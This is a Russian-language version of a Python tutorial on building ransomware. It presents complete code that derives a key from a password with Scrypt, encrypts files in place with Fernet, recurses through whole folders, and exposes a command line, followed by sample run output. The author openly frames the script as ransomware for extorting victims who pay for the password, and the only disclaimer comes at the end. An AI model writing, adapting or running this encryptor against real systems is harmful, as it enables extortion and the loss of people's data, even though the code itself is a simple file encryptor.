# [How to Make a Ransomware in Python](https://www.thepythoncode.com/article/make-a-ransomware-in-python)
##
# [[] / []]()
Ransomware — это тип вредоносного ПО, которое шифрует файлы системы и расшифровывает только после того, как злоумышленнику выплачивается денежная сумма.

Шифрование — это процесс преобразования открытого текста, который представляет собой данные, читаемые людьми, в зашифрованный текст, который представляет собой зашифрованную версию данных, которую люди не могут прочитать. Процесс преобразования зашифрованного текста обратно в открытый текст называется расшифровкой.

Шифрование используется для защиты данных во время передачи, хранения и обработки. Это фундаментальный инструмент защиты информации от несанкционированного доступа и необходим для поддержания конфиденциальности и целостности данных. Шифрование используется в различных приложениях, включая безопасную связь, безопасный онлайн-банкинг и покупки, а также защиту конфиденциальных данных, хранящихся на компьютерах и серверах.

Существует два основных метода шифрования: шифрование с симметричным ключом и шифрование с открытым ключом (асимметричное). Шифрование с симметричным ключом включает в себя использование одного и того же ключа как для шифрования, так и для расшифровки (который мы будем использовать в этом учебнике), в то время как шифрование с открытым ключом использует пару ключей, открытый ключ для шифрования и закрытый ключ для расшифровки.

Существует множество типов программ-вымогателей. Тот, который мы построим в этом учебнике, использует тот же пароль для шифрования и расшифровки данных. Другими словами, мы используем функции вывода ключа для получения ключа из пароля. Так, гипотетически, когда жертва заплатит нам, мы просто дадим ему пароль для расшифровки своих файлов.

Таким образом, вместо того, чтобы случайным образом генерировать ключ, мы используем пароль для получения ключа, и для этого существуют алгоритмы. Одним из таких алгоритмов является Scrypt, функция вывода ключа на основе пароля, созданная в 2009 году Колином Персивалем.

Этот учебник в основном расширит учебник по шифрованию; многие из основных функций привезены оттуда.

Начало работы
Чтобы начать писать программы-вымогатели, нам нужно установить библиотеку криптографии:

$ pip install cryptography
Существует множество алгоритмов шифрования. Эта библиотека построена поверх алгоритма шифрования AES.

Откройте новый файл, назовите его ransomware.py и импортируйте следующее:

import pathlib
import secrets
import os
import base64
import getpass

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
Не беспокойтесь об этих импортированных библиотеках на данный момент. Я объясню каждую часть кода по мере продвижения.

Получите: Создайте более 35 этических хакерских инструментов и скриптов с помощью python EBook.

Получение ключа из пароля
Во-первых, функции вывода ключей нуждаются в случайных битах, добавленных к паролю перед его хэшированием; эти биты часто называют солями, которые помогают укрепить безопасность и защитить от словарных и грубых атак. Сделаем функцию для генерации этого с помощью модуля secrets:

def generate_salt(size=16):
    """Generate the salt used for key derivation, 
    `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)
Мы используем модуль секретов вместо случайного, потому что секреты используются для генерации криптографически надежных случайных чисел, подходящих для генерации паролей, токенов безопасности, солей и т. Д.

Далее сделаем функцию для получения ключа из пароля и соли:

def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())
Мы инициализируем алгоритм Scrypt, передавая следующее:

Соль.
Желаемая длина ключа (32 в данном случае).
n: параметр стоимости ЦП/Памяти, который должен быть больше 1 и иметь мощность 2.
r: Параметр размера блока.
p: Параметр распараллеливания.
Как упоминалось в документации, n, r и p могут регулировать стоимость вычислений и памяти алгоритма Scrypt. RFC 7914 рекомендует r=8, p=1, где оригинальная статья Scrypt предполагает, что n должно иметь минимальное значение 2**14 для интерактивных входов или 2**20 для более конфиденциальных файлов, вы можете проверить документацию для получения дополнительной информации.

Далее делаем функцию загрузки ранее сгенерированной соли:

def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()
Теперь, когда у нас есть функции генерации соли и вывода ключей, давайте создадим основную функцию, которая генерирует ключ из пароля:

def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    """Generates a key from a `password` and the salt.
    If `load_existing_salt` is True, it'll load the salt from a file
    in the current directory called "salt.salt".
    If `save_salt` is True, then it will generate a new salt
    and save it to "salt.salt" """
    if load_existing_salt:
        # load existing salt
        salt = load_salt()
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)
Приведенная выше функция принимает следующие аргументы:

password: строка пароля, из которой создается ключ.
salt_size: целое число, указывающее размер генерируемой соли.
load_existing_salt: логическое значение, указывающее, загружаем ли мы ранее сгенерированную соль.
save_salt: Булев, указывающий, сохраняем ли мы сгенерированную соль.
После загрузки или генерации новой соли мы получаем ключ из пароля с помощью функции derive_key() и возвращаем ключ в виде текста в кодировке Base64.

Связанные с: Как создать обратную оболочку в Python

Шифрование файлов
Теперь мы углубимся в самую захватывающую часть, функции шифрования и расшифровки:

def encrypt(filename, key):
    """Given a filename (str) and key (bytes), it encrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)
Довольно просто, после того, как мы сделаем объект Fernet из ключа, переданного этой функции, мы прочитаем данные файла и зашифруем их с помощью метода Fernet.encrypt().

После этого мы берем зашифрованные данные и переопределяем исходный файл с зашифрованным файлом, просто записывая файл с тем же исходным именем.

Расшифровка файлов
Хорошо, это сделано. Перейдя к функции расшифровки сейчас, это тот же процесс, за исключением того, что мы будем использовать функцию decrypt() вместо encrypt() для объекта Fernet:

def decrypt(filename, key):
    """Given a filename (str) and key (bytes), it decrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token, most likely the password is incorrect")
        return
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)
Мы добавляем простой блок try-except для обработки исключения, когда пароль неправильный.

Опять же, две вышеуказанные функции были взяты из учебника по шифрованию.

Получите: Создайте более 35 этических хакерских инструментов и скриптов с помощью python EBook.

Шифрование и расшифровка папок
Замечательно! Прежде чем тестировать наши функции, мы должны помнить, что программы-вымогатели шифруют целые папки или даже всю компьютерную систему, а не только один файл.

Поэтому мы должны написать код для шифрования папок с их подпапками и файлами. Начнем с шифрования папок:

def encrypt_folder(foldername, key):
    # if it's a folder, encrypt the entire folder (i.e all the containing files)
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            # encrypt the file
            encrypt(child, key)
        elif child.is_dir():
            # if it's a folder, encrypt the entire folder by calling this function recursively
            encrypt_folder(child, key)
Не так уж и сложно; мы используем метод glob() из класса Path() модуля pathlib для получения всех вложенных папок и файлов в этой папке. Это то же самое, что и os.scandir(), за исключением того, что pathlib возвращает объекты Path, а не обычные строки Python.

Внутри цикла for мы проверяем, является ли этот объект дочернего пути файлом или папкой. Мы используем нашу ранее определенную функцию encrypt(), если это файл. Если это папка, мы рекурсивно запускаем encrypt_folder(), но передаем дочерний путь в аргумент foldername.

То же самое для расшифровки папок:

def decrypt_folder(foldername, key):
    # if it's a folder, decrypt the entire folder
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            # decrypt the file
            decrypt(child, key)
        elif child.is_dir():
            # if it's a folder, decrypt the entire folder by calling this function recursively
            decrypt_folder(child, key)
Это здорово! Теперь все, что нам нужно сделать, это использовать модуль argparse, чтобы сделать наш скрипт максимально удобным для использования из командной строки:

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="File Encryptor Script with a Password")
    parser.add_argument("path", help="Path to encrypt/decrypt, can be a file or an entire folder")
    parser.add_argument("-s", "--salt-size", help="If this is set, a new salt with the passed size is generated",
                        type=int)
    parser.add_argument("-e", "--encrypt", action="store_true",
                        help="Whether to encrypt the file/folder, only -e or -d can be specified.")
    parser.add_argument("-d", "--decrypt", action="store_true",
                        help="Whether to decrypt the file/folder, only -e or -d can be specified.")
    # parse the arguments
    args = parser.parse_args()
    # get the password
    if args.encrypt:
        password = getpass.getpass("Enter the password for encryption: ")
    elif args.decrypt:
        password = getpass.getpass("Enter the password you used for encryption: ")
    # generate the key
    if args.salt_size:
        key = generate_key(password, salt_size=args.salt_size, save_salt=True)
    else:
        key = generate_key(password, load_existing_salt=True)
    # get the encrypt and decrypt flags
    encrypt_ = args.encrypt
    decrypt_ = args.decrypt
    # check if both encrypt and decrypt are specified
    if encrypt_ and decrypt_:
        raise TypeError("Please specify whether you want to encrypt the file or decrypt it.")
    elif encrypt_:
        if os.path.isfile(args.path):
            # if it is a file, encrypt it
            encrypt(args.path, key)
        elif os.path.isdir(args.path):
            encrypt_folder(args.path, key)
    elif decrypt_:
        if os.path.isfile(args.path):
            decrypt(args.path, key)
        elif os.path.isdir(args.path):
            decrypt_folder(args.path, key)
    else:
        raise TypeError("Please specify whether you want to encrypt the file or decrypt it.")
Итак, мы ожидаем в общей сложности четыре параметра, которые являются путем к папке / файлу для шифрования или расшифровки, размером соли, который, если он передается, генерирует новую соль с заданным размером, и следует ли шифровать или расшифровывать с помощью параметров -e или -d соответственно.

Узнайте также: Как сделать кейлоггер на Python.

Выполнение кода
Чтобы протестировать наш скрипт, вы должны придумать файлы, которые вам не нужны, или иметь их копию где-то на вашем компьютере. Для моего случая я сделал папку с именем test-folder в том же каталоге, где находится ransomware.py, и принес некоторые PDF-документы, изображения, текстовые файлы и другие файлы. Вот его содержание:

Пример папки

А вот что находится в папке «Файлы»:

Внутри папки «Файлы»

Там, где архив и программы содержат некоторые zip-файлы и исполняемые файлы, давайте попробуем зашифровать всю эту папку тестовой папки:

$ python ransomware.py -e test-folder -s 32
Я указал размер соли 32 и передал тестовую папку скрипту. Вам будет предложено ввести пароль для шифрования; воспользуемся "1234":

Enter the password for encryption:
[*] Encrypting test-folder\Documents\2171614.xlsx
[*] Encrypting test-folder\Documents\receipt.pdf
[*] Encrypting test-folder\Files\Archive\12_compressed.zip
[*] Encrypting test-folder\Files\Archive\81023_Win.zip
[*] Encrypting test-folder\Files\Programs\Postman-win64-9.15.2-Setup.exe
[*] Encrypting test-folder\Pictures\crai.png
[*] Encrypting test-folder\Pictures\photo-22-09.jpg
[*] Encrypting test-folder\Pictures\photo-22-14.jpg
[*] Encrypting test-folder\test.txt
[*] Encrypting test-folder\test2.txt
[*] Encrypting test-folder\test3.txt
Вам будет предложено ввести пароль, get_pass() скрывает введенные символы, поэтому он более безопасен.

Похоже, скрипт успешно зашифровал всю папку! Вы можете проверить его самостоятельно на папке, которую вы придумали (я настаиваю, пожалуйста, не используйте его в нужных вам файлах и не используйте копию в другом месте).

Файлы остаются в том же расширении, но если вы щелкните правой кнопкой мыши, вы не сможете ничего прочитать.

Вы также заметите, что файл salt.salt появился в вашем текущем рабочем каталоге. Не удаляйте его, так как это необходимо для процесса расшифровки.

Попробуем расшифровать его неправильным паролем, что-то вроде «1235», а не «1234»:

$ python ransomware.py -d test-folder
Enter the password you used for encryption:
[*] Decrypting test-folder\Documents\2171614.xlsx
[!] Invalid token, most likely the password is incorrect
[*] Decrypting test-folder\Documents\receipt.pdf
[!] Invalid token, most likely the password is incorrect
[*] Decrypting test-folder\Files\Archive\12_compressed.zip
[!] Invalid token, most likely the password is incorrect
[*] Decrypting test-folder\Files\Archive\81023_Win.zip
[!] Invalid token, most likely the password is incorrect
[*] Decrypting test-folder\Files\Programs\Postman-win64-9.15.2-Setup.exe
[!] Invalid token, most likely the password is incorrect
[*] Decrypting test-folder\Pictures\crai.png
[!] Invalid token, most likely the password is incorrect
[*] Decrypting test-folder\Pictures\photo-22-09.jpg
[!] Invalid token, most likely the password is incorrect
[*] Decrypting test-folder\Pictures\photo-22-14.jpg
[!] Invalid token, most likely the password is incorrect
[*] Decrypting test-folder\test.txt
[!] Invalid token, most likely the password is incorrect
[*] Decrypting test-folder\test2.txt
[!] Invalid token, most likely the password is incorrect
[*] Decrypting test-folder\test3.txt
[!] Invalid token, most likely the password is incorrect
В процессе расшифровки не передавайте -s, так как он сгенерирует новую соль и переопределит предыдущую соль, которая использовалась для шифрования, и поэтому вы не сможете восстановить свои файлы. Вы можете отредактировать код, чтобы предотвратить этот параметр в расшифровке.

Папка по-прежнему зашифрована, так как пароль неправильный. Давайте перезапустим с правильным паролем "1234":

$ python ransomware.py -d test-folder
Enter the password you used for encryption:
[*] Decrypting test-folder\Documents\2171614.xlsx
[*] Decrypting test-folder\Documents\receipt.pdf
[*] Decrypting test-folder\Files\Archive\12_compressed.zip
[*] Decrypting test-folder\Files\Archive\81023_Win.zip
[*] Decrypting test-folder\Files\Programs\Postman-win64-9.15.2-Setup.exe
[*] Decrypting test-folder\Pictures\crai.png
[*] Decrypting test-folder\Pictures\photo-22-09.jpg
[*] Decrypting test-folder\Pictures\photo-22-14.jpg
[*] Decrypting test-folder\test.txt
[*] Decrypting test-folder\test2.txt
[*] Decrypting test-folder\test3.txt
Вся папка возвращается к исходному виду; теперь все файлы читаемы! Так что это работает!

Отказ: Важно отметить, что создание и распространение программ-вымогателей является незаконным и неэтичным. Это может нанести значительный вред отдельным лицам и организациям, нарушив их работу и потенциально стоив им большой суммы денег для восстановления их файлов. Важно использовать шифрование ответственно и только в законных целях.

Заключение
В учебнике описан процесс создания программ-вымогателей, типа вредоносного программного обеспечения, которое шифрует файлы жертвы и требует оплаты в обмен на ключ расшифровки. Ключ извлекается из пароля с использованием алгоритма Scrypt и соли, что помогает усилить безопасность процесса получения ключа. Хотя шифрование может быть полезным инструментом для защиты данных, важно использовать его ответственно и не создавать или распространять вредоносное программное обеспечение, такое как программы-вымогатели, поскольку оно может нанести значительный вред и является незаконным.